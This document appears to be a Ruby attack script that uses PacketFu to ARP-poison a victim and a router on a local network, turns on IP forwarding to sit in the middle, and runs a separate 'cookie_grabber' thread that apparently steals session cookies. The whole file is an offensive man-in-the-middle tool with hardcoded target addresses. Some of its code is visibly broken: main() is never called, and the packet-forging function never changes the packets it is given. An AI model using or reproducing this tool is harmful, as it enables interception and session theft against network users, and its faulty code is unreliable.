#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'
require './gdns.rb'

$iface = "em1"
$arp_packet_target = PacketFu::ARPPacket.new()
$arp_packet_router = PacketFu::ARPPacket.new()
$sMac = '78:2b:cb:96:ba:de'  # source mac address, eg, address to redirect victim to
$tMac = '78:2b:cb:a3:db:85'  # target mac address, eg, address to poison
$rMac = '00:1a:6d:38:15:ff'  # routers mac address
$sIP = '192.168.0.12'        # source IP address
$tIP = '192.168.0.11'        # target IP address
$rIP = '192.168.0.100'       # router IP address


def main()
  forgePacket(arp_packet_target, $sMac, $tMac, $tIP, $rIP)
  forgePacket(arp_packet_router, $sMac, $rMac, $tIP, $rIP)
  `echo 1 > /proc/sys/net/ipv4/ip_forward`
end

def forgePacket(arp_packet_target, sMac, tMac, tIP, rIP)
  arp_packet_target = PacketFu::ARPPacket.new()
  arp_packet_target.eth_saddr = sMac       # sender's MAC address
  arp_packet_target.eth_daddr = tMac       # router's MAC address
  arp_packet_target.arp_saddr_mac = sMac   # sender's MAC address
  arp_packet_target.arp_daddr_mac = tMac   # router's MAC address
  arp_packet_target.arp_saddr_ip = tIP     # target's IP
  arp_packet_target.arp_daddr_ip = rIP     # router's IP
  arp_packet_target.arp_opcode = 2         # arp code 2 == ARP reply
end

def fixSpoof(arp_packet_target, arp_packet_router)
  forgePacket(arp_packet_target, $rMac, $tMac, $tIP, $rIP)
  forgePacket(arp_packet_router, $tMac, $rMac, $tIP, $rIP)
  arp_packet_target.to_w($iface)
  arp_packet_router.to_w($iface)
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
end

def runSpoof(arp_packet_target,arp_packet_router)
  # Send out both packets
  iface = "em1"
  caught=false
  while caught==false do
    sleep 1
    arp_packet_target.to_w($iface)
    arp_packet_router.to_w($iface)
  end
end

begin
  puts "Starting threads!"
  spoof_thread = Thread.new{runSpoof($arp_packet_target, $arp_packet_router)} 
  cookie_thread = Thread.new{cookie_grabber} 
  spoof_thread.join
  cookie_thread.join

  rescue Interrupt # Catch the interrupt and kill the threads, and fix the arps
    puts "\nARP spoof stopped by interrupt signal."
    Thread.kill(spoof_thread)
    Thread.kill(cookie_thread)
    fixSpoof($arp_packet_target, $arp_packet_router)
  exit 0
end
